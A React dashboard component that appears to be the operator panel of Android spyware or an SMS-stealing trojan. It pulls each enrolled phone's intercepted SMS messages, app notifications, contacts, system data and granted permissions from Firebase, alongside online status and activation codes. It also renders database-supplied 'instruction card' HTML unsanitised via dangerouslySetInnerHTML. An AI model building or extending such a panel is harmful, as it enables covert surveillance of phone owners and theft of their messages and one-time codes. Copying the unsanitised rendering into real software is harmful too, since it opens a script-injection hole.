import { useEffect, useState } from 'react'
import { ref, onValue, off, get } from 'firebase/database'
import { database } from '@/lib/firebase'
import {
  getDevicePath,
  getDeviceMessagesPath,
  getDeviceNotificationsPath,
  getDeviceContactsPath,
  getDeviceSystemInfoPath,
  getDevicePermissionsPath,
  getDevicePermissionStatusPath,
  getDeviceInstructionCardPath,
  getDeviceMetadataPath,
} from '@/lib/firebase-helpers'
import { query, orderByKey, limitToLast } from 'firebase/database'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/component/ui/tabs'
import { Badge } from '@/component/ui/badge'
import { Button } from '@/component/ui/button'
import {
  Battery,
  Activity,
  Wifi,
  WifiOff,
  Smartphone,
  MessageSquare,
  Bell,
  Contact,
  Settings,
  FileText,
  Shield,
  AlertCircle,
} from 'lucide-react'
import { formatDistanceToNow } from 'date-fns'
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/component/ui/table'

interface DeviceDetailsViewProps {
  deviceId: string
  onClose?: () => void
}

/**
 * Device Details View
 * Comprehensive view showing all device information in tabs:
 * - Overview
 * - Messages (Real-time)
 * - Notifications (Real-time)
 * - Contacts
 * - System Info
 * - Permissions
 * - Instructions
 */
export default function DeviceDetailsView({ deviceId, onClose }: DeviceDetailsViewProps) {
  const [activeTab, setActiveTab] = useState('overview')
  const [deviceMetadata, setDeviceMetadata] = useState<any>({})
  const [messages, setMessages] = useState<any[]>([])
  const [notifications, setNotifications] = useState<any[]>([])
  const [contacts, setContacts] = useState<any[]>([])
  const [systemInfo, setSystemInfo] = useState<any>({})
  const [permissions, setPermissions] = useState<any>({})
  const [instructionCard, setInstructionCard] = useState<any>({})
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    // Load device metadata
    const metadataRef = getDeviceMetadataPath(deviceId)
    const unsubscribeMetadata = onValue(metadataRef, snapshot => {
      if (snapshot.exists()) {
        setDeviceMetadata(snapshot.val())
      }
      setLoading(false)
    })

    // Load messages (real-time)
    const messagesRef = getDeviceMessagesPath(deviceId)
    const unsubscribeMessages = onValue(messagesRef, snapshot => {
      if (snapshot.exists()) {
        const msgs = snapshot.val()
        const messageArray = Object.entries(msgs).map(([timestamp, value]) => {
          if (typeof value === 'string') {
            const parts = value.split('~')
            return {
              timestamp: parseInt(timestamp),
              type: parts[0] || 'unknown',
              phone: parts[1] || '',
              body: parts[2] || value,
            }
          }
          return {
            timestamp: parseInt(timestamp),
            ...(typeof value === 'object' && value !== null ? value : {}),
          }
        })
        messageArray.sort((a, b) => b.timestamp - a.timestamp)
        setMessages(messageArray.slice(0, 100)) // Last 100 messages
      } else {
        setMessages([])
      }
    })

    // Load notifications (real-time)
    const notificationsRef = getDeviceNotificationsPath(deviceId)
    const unsubscribeNotifications = onValue(notificationsRef, snapshot => {
      if (snapshot.exists()) {
        const notifs = snapshot.val()
        const notificationArray = Object.entries(notifs).map(([key, value]: [string, any]) => ({
          id: key,
          timestamp: value.timestamp || parseInt(key),
          ...value,
        }))
        notificationArray.sort((a, b) => b.timestamp - a.timestamp)
        setNotifications(notificationArray.slice(0, 100)) // Last 100 notifications
      } else {
        setNotifications([])
      }
    })

    // Load contacts
    const contactsRef = getDeviceContactsPath(deviceId)
    const unsubscribeContacts = onValue(contactsRef, snapshot => {
      if (snapshot.exists()) {
        const contactsData = snapshot.val()
        const contactArray = Object.entries(contactsData).map(([phone, value]: [string, any]) => ({
          phone,
          ...value,
        }))
        setContacts(contactArray)
      } else {
        setContacts([])
      }
    })

    // Load permissions - try new permissionStatus path first (from checkPermission command)
    // If not found, fall back to old permission path
    const permissionStatusRef = getDevicePermissionStatusPath(deviceId)
    const permissionStatusQuery = query(permissionStatusRef, orderByKey(), limitToLast(1))
    const unsubscribePermissionStatus = onValue(
      permissionStatusQuery,
      snapshot => {
        if (snapshot.exists()) {
          // Get the latest permission status entry (new structure)
          const entries = snapshot.val()
          const timestamps = Object.keys(entries)
            .map(ts => parseInt(ts))
            .sort((a, b) => b - a)
          if (timestamps.length > 0) {
            const latestEntry = entries[timestamps[0].toString()]
            // Convert new structure to old structure format for compatibility
            const convertedPermissions: any = {}

            // Runtime permissions
            if (latestEntry.runtimePermissions) {
              const runtimePerms = latestEntry.runtimePermissions
              // Check SMS permissions (RECEIVE_SMS and READ_SMS)
              const receiveSms = runtimePerms['android.permission.RECEIVE_SMS']?.granted || false
              const readSms = runtimePerms['android.permission.READ_SMS']?.granted || false
              convertedPermissions.sms = receiveSms && readSms

              // Check contacts permission
              convertedPermissions.contacts =
                runtimePerms['android.permission.READ_CONTACTS']?.granted || false

              // Check phone state permission
              convertedPermissions.phone_state =
                runtimePerms['android.permission.READ_PHONE_STATE']?.granted || false
            }

            // Special permissions
            if (latestEntry.notificationListener) {
              convertedPermissions.notification = latestEntry.notificationListener.granted || false
            }
            if (latestEntry.batteryOptimization) {
              convertedPermissions.battery = latestEntry.batteryOptimization.granted || false
            }

            // Store full permission status for detailed display
            convertedPermissions._fullStatus = latestEntry
            convertedPermissions._timestamp = timestamps[0]

            setPermissions(convertedPermissions)
          } else {
            // No entries found, try old path
            const permissionsRef = getDevicePermissionsPath(deviceId)
            get(permissionsRef).then(oldSnapshot => {
              if (oldSnapshot.exists()) {
                setPermissions(oldSnapshot.val())
              } else {
                setPermissions({})
              }
            })
          }
        } else {
          // No new format found, try old path
          const permissionsRef = getDevicePermissionsPath(deviceId)
          get(permissionsRef).then(oldSnapshot => {
            if (oldSnapshot.exists()) {
              setPermissions(oldSnapshot.val())
            } else {
              setPermissions({})
            }
          })
        }
      },
      error => {
        console.error('Error loading permission status:', error)
        // Fallback to old path on error
        const permissionsRef = getDevicePermissionsPath(deviceId)
        get(permissionsRef).then(oldSnapshot => {
          if (oldSnapshot.exists()) {
            setPermissions(oldSnapshot.val())
          } else {
            setPermissions({})
          }
        })
      }
    )

    // Load system info
    const systemInfoRef = getDeviceSystemInfoPath(deviceId)
    get(systemInfoRef).then(snapshot => {
      if (snapshot.exists()) {
        setSystemInfo(snapshot.val())
      }
    })

    // Load instruction card
    const instructionRef = getDeviceInstructionCardPath(deviceId)
    const unsubscribeInstruction = onValue(instructionRef, snapshot => {
      if (snapshot.exists()) {
        setInstructionCard(snapshot.val())
      } else {
        setInstructionCard({ html: '', css: '' })
      }
    })

    return () => {
      off(metadataRef, 'value', unsubscribeMetadata)
      off(messagesRef, 'value', unsubscribeMessages)
      off(notificationsRef, 'value', unsubscribeNotifications)
      off(contactsRef, 'value', unsubscribeContacts)
      off(permissionStatusQuery, 'value', unsubscribePermissionStatus)
      off(instructionRef, 'value', unsubscribeInstruction)
    }
  }, [deviceId])

  const isOnline = deviceMetadata.lastSeen
    ? Date.now() - deviceMetadata.lastSeen < 300000 // 5 minutes
    : false

  const formatTimestamp = (timestamp: number) => {
    try {
      return new Date(timestamp).toLocaleString('en-US')
    } catch {
      return 'Invalid date'
    }
  }

  const getPermissionBadge = (granted: boolean | undefined) => {
    if (granted === undefined) {
      return <Badge variant="secondary">Unknown</Badge>
    }
    return granted ? (
      <Badge className="bg-green-500">Granted</Badge>
    ) : (
      <Badge variant="destructive">Denied</Badge>
    )
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center p-8">
        <div className="text-muted-foreground">Loading device details...</div>
      </div>
    )
  }

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Smartphone className="h-5 w-5" />
          <h2 className="text-2xl font-bold">Device Details</h2>
          <Badge variant="outline" className="font-mono text-xs">
            {deviceId.substring(0, 12)}...
          </Badge>
        </div>
        {onClose && (
          <Button variant="ghost" onClick={onClose}>
            Close
          </Button>
        )}
      </div>

      <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
        <TabsList className="grid w-full grid-cols-7">
          <TabsTrigger value="overview">Overview</TabsTrigger>
          <TabsTrigger value="messages">
            Messages
            {messages.length > 0 && (
              <Badge variant="secondary" className="ml-2">
                {messages.length}
              </Badge>
            )}
          </TabsTrigger>
          <TabsTrigger value="notifications">
            Notifications
            {notifications.length > 0 && (
              <Badge variant="secondary" className="ml-2">
                {notifications.length}
              </Badge>
            )}
          </TabsTrigger>
          <TabsTrigger value="contacts">
            Contacts
            {contacts.length > 0 && (
              <Badge variant="secondary" className="ml-2">
                {contacts.length}
              </Badge>
            )}
          </TabsTrigger>
          <TabsTrigger value="system">System</TabsTrigger>
          <TabsTrigger value="permissions">Permissions</TabsTrigger>
          <TabsTrigger value="instructions">Instructions</TabsTrigger>
        </TabsList>

        <TabsContent value="overview" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {/* Status Card */}
            <div className="rounded-lg border p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm text-muted-foreground">Status</span>
                {isOnline ? (
                  <Badge className="bg-green-500">Online</Badge>
                ) : (
                  <Badge variant="destructive">Offline</Badge>
                )}
              </div>
              <div className="text-sm">
                {deviceMetadata.lastSeen ? (
                  <span>
                    Last seen:{' '}
                    {formatDistanceToNow(new Date(deviceMetadata.lastSeen), { addSuffix: true })}
                  </span>
                ) : (
                  <span className="text-muted-foreground">Never</span>
                )}
              </div>
            </div>

            {/* Battery Card */}
            <div className="rounded-lg border p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm text-muted-foreground">Battery</span>
                <Battery
                  className={`h-4 w-4 ${deviceMetadata.batteryPercentage > 50 ? 'text-green-500' : deviceMetadata.batteryPercentage > 20 ? 'text-yellow-500' : 'text-red-500'}`}
                />
              </div>
              <div className="text-2xl font-bold">
                {deviceMetadata.batteryPercentage !== undefined
                  ? `${deviceMetadata.batteryPercentage}%`
                  : 'N/A'}
              </div>
            </div>

            {/* Active Status */}
            <div className="rounded-lg border p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm text-muted-foreground">Activation</span>
                {deviceMetadata.isActive ? (
                  <Badge className="bg-green-500">Active</Badge>
                ) : (
                  <Badge variant="secondary">Inactive</Badge>
                )}
              </div>
              <div className="text-sm">
                {deviceMetadata.code ? (
                  <span className="font-mono">{deviceMetadata.code}</span>
                ) : (
                  <span className="text-muted-foreground">No code</span>
                )}
              </div>
            </div>
          </div>

          {/* Device Info */}
          <div className="rounded-lg border p-4">
            <h3 className="font-semibold mb-4">Device Information</h3>
            <div className="grid grid-cols-2 gap-4 text-sm">
              <div>
                <span className="text-muted-foreground">Device Name:</span>
                <div className="font-medium">{deviceMetadata.name || 'Unknown'}</div>
              </div>
              <div>
                <span className="text-muted-foreground">Phone Number:</span>
                <div className="font-medium">
                  {deviceMetadata.phone || deviceMetadata.currentPhone || 'N/A'}
                </div>
              </div>
              <div>
                <span className="text-muted-foreground">Device ID:</span>
                <div className="font-mono text-xs">{deviceId}</div>
              </div>
              <div>
                <span className="text-muted-foreground">Initialized:</span>
                <div>{deviceMetadata.time ? formatTimestamp(deviceMetadata.time) : 'N/A'}</div>
              </div>
            </div>
          </div>
        </TabsContent>

        <TabsContent value="messages" className="space-y-4">
          <div className="rounded-lg border">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Time</TableHead>
                  <TableHead>Direction</TableHead>
                  <TableHead>Phone</TableHead>
                  <TableHead>Message</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {messages.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={4} className="text-center text-muted-foreground py-8">
                      No messages found
                    </TableCell>
                  </TableRow>
                ) : (
                  messages.map((msg, idx) => (
                    <TableRow key={idx}>
                      <TableCell className="text-xs">{formatTimestamp(msg.timestamp)}</TableCell>
                      <TableCell>
                        {msg.type === 'sent' ? (
                          <Badge variant="outline" className="bg-blue-50">
                            Sent
                          </Badge>
                        ) : (
                          <Badge variant="outline" className="bg-green-50">
                            Received
                          </Badge>
                        )}
                      </TableCell>
                      <TableCell className="font-mono text-sm">{msg.phone || 'N/A'}</TableCell>
                      <TableCell className="max-w-md truncate">{msg.body}</TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </TabsContent>

        <TabsContent value="notifications" className="space-y-4">
          <div className="rounded-lg border">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Time</TableHead>
                  <TableHead>App</TableHead>
                  <TableHead>Title</TableHead>
                  <TableHead>Content</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {notifications.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={4} className="text-center text-muted-foreground py-8">
                      No notifications found
                    </TableCell>
                  </TableRow>
                ) : (
                  notifications.map(notif => (
                    <TableRow key={notif.id}>
                      <TableCell className="text-xs">{formatTimestamp(notif.timestamp)}</TableCell>
                      <TableCell>
                        <Badge variant="outline">
                          {notif.appName || notif.packageName || 'Unknown'}
                        </Badge>
                      </TableCell>
                      <TableCell className="font-medium">{notif.title || 'N/A'}</TableCell>
                      <TableCell className="max-w-md truncate">
                        {notif.text || notif.body || 'N/A'}
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </TabsContent>

        <TabsContent value="contacts" className="space-y-4">
          <div className="rounded-lg border">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Name</TableHead>
                  <TableHead>Phone</TableHead>
                  <TableHead>Email</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {contacts.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={3} className="text-center text-muted-foreground py-8">
                      No contacts found
                    </TableCell>
                  </TableRow>
                ) : (
                  contacts.map((contact, idx) => (
                    <TableRow key={idx}>
                      <TableCell>{contact.name || contact.displayName || 'Unknown'}</TableCell>
                      <TableCell className="font-mono">
                        {contact.phone || contact.phoneNumber || 'N/A'}
                      </TableCell>
                      <TableCell>{contact.emails?.[0]?.address || 'N/A'}</TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </TabsContent>

        <TabsContent value="system" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {Object.entries(systemInfo).map(([key, value]: [string, any]) => (
              <div key={key} className="rounded-lg border p-4">
                <h3 className="font-semibold mb-2 capitalize">
                  {key.replace(/([A-Z])/g, ' $1').trim()}
                </h3>
                <pre className="text-xs overflow-auto max-h-64 bg-muted p-2 rounded">
                  {JSON.stringify(value, null, 2)}
                </pre>
              </div>
            ))}
            {Object.keys(systemInfo).length === 0 && (
              <div className="col-span-full text-center text-muted-foreground py-8">
                No system information available
              </div>
            )}
          </div>
        </TabsContent>

        <TabsContent value="permissions" className="space-y-4">
          <div className="rounded-lg border p-4">
            <div className="flex items-center justify-between mb-4">
              <h3 className="font-semibold">Permission Status</h3>
              {permissions._fullStatus && (
                <div className="text-xs text-muted-foreground">
                  Last checked:{' '}
                  {permissions._timestamp ? formatTimestamp(permissions._timestamp) : 'N/A'}
                  {permissions._fullStatus.grantedCount !== undefined && (
                    <span className="ml-2">
                      ({permissions._fullStatus.grantedCount}/{permissions._fullStatus.totalCount}{' '}
                      granted)
                    </span>
                  )}
                </div>
              )}
            </div>

            {/* Overall Status */}
            {permissions._fullStatus && (
              <div className="mb-4 p-3 rounded-lg bg-muted">
                <div className="flex items-center justify-between">
                  <span className="font-medium">Overall Status</span>
                  {permissions._fullStatus.allGranted ? (
                    <Badge className="bg-green-500">All Granted</Badge>
                  ) : (
                    <Badge variant="secondary" className="bg-yellow-500">
                      Partial
                    </Badge>
                  )}
                </div>
              </div>
            )}

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Runtime Permissions */}
              {permissions._fullStatus?.runtimePermissions ? (
                <>
                  {Object.entries(permissions._fullStatus.runtimePermissions).map(
                    ([permName, permData]: [string, any]) => {
                      const displayName = permName
                        .replace('android.permission.', '')
                        .replace(/_/g, ' ')
                        .toLowerCase()
                        .replace(/\b\w/g, l => l.toUpperCase())
                      return (
                        <div key={permName} className="flex items-center justify-between">
                          <span>{displayName}</span>
                          {getPermissionBadge(permData.granted)}
                        </div>
                      )
                    }
                  )}
                </>
              ) : (
                <>
                  {/* Legacy format fallback */}
                  <div className="flex items-center justify-between">
                    <span>SMS Permissions</span>
                    {getPermissionBadge(permissions.sms)}
                  </div>
                  <div className="flex items-center justify-between">
                    <span>Contacts Permission</span>
                    {getPermissionBadge(permissions.contacts)}
                  </div>
                  <div className="flex items-center justify-between">
                    <span>Phone State</span>
                    {getPermissionBadge(permissions.phone_state)}
                  </div>
                </>
              )}

              {/* Special Permissions */}
              <div className="flex items-center justify-between">
                <span>Notification Listener</span>
                {getPermissionBadge(
                  permissions._fullStatus?.notificationListener?.granted ?? permissions.notification
                )}
              </div>
              <div className="flex items-center justify-between">
                <span>Battery Optimization</span>
                {getPermissionBadge(
                  permissions._fullStatus?.batteryOptimization?.granted ?? permissions.battery
                )}
              </div>
            </div>

            {/* Show detailed status if available */}
            {permissions._fullStatus && (
              <div className="mt-4 pt-4 border-t">
                <details className="text-sm">
                  <summary className="cursor-pointer text-muted-foreground hover:text-foreground">
                    View Detailed Status (JSON)
                  </summary>
                  <pre className="mt-2 p-3 bg-muted rounded text-xs overflow-auto max-h-64">
                    {JSON.stringify(permissions._fullStatus, null, 2)}
                  </pre>
                </details>
              </div>
            )}
          </div>
        </TabsContent>

        <TabsContent value="instructions" className="space-y-4">
          <div className="rounded-lg border p-4">
            <h3 className="font-semibold mb-4">Instruction Card</h3>
            {instructionCard.html ? (
              <div className="prose max-w-none">
                <div dangerouslySetInnerHTML={{ __html: instructionCard.html }} />
                {instructionCard.css && <style>{instructionCard.css}</style>}
              </div>
            ) : (
              <div className="text-center text-muted-foreground py-8">No instruction card set</div>
            )}
          </div>
        </TabsContent>
      </Tabs>
    </div>
  )
}
